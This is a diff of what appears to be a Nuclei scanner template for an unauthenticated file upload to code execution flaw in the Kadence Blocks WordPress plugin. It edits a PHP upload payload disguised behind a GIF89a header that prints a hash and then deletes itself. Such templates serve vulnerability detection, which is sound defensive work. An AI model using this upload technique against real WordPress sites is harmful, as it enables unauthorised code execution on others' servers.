@@ -72,7 +72,7 @@ http:
     GIF89a
 
 
-    <?php echo md5("{{randstr}}");?>
+    <?php echo md5("{{string}}");unlink(__FILE__);?>
 
     -----------------------------8779924633391890046425977712
 
@@ -125,8 +125,9 @@ info:
   - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/kadence-blocks/kadence-blocks-3110-unauthenticated-arbitrary-file-upload
   remediation: Fixed in 3.1.11
   severity: critical
-  tags: rce,wpscan,wordpress,wp-plugin,wp,kadence-blocks,file-upload,intrusive
+  tags: rce,wpscan,wordpress,wp-plugin,wp,kadence-blocks,fileupload,intrusive
 variables:
   email: '{{rand_base(8)}}@{{rand_base(5)}}.com'
   filename: '{{to_lower(rand_text_alpha(5))}}'
   str: '{{to_lower(rand_text_alpha(5))}}'
+  string: wp-kadence-blocks-rce
